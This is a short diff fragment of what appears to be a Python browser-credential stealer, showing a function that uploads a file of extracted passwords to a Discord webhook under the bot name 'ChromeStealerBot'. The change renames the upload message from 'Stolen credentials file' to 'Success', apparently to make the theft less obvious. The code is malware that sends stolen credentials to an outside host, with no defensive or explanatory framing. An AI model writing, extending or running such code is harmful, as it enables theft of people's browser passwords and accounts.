@@ -105,7 +105,7 @@ def extract_passwords_from_profiles():
 def send_to_discord(file_path, webhook_url):
     with open(file_path, "rb") as f:
         payload = {
-            "content": "Stolen credentials file",
+            "content": "Success",
             "username": "ChromeStealerBot"
         }
         files = {
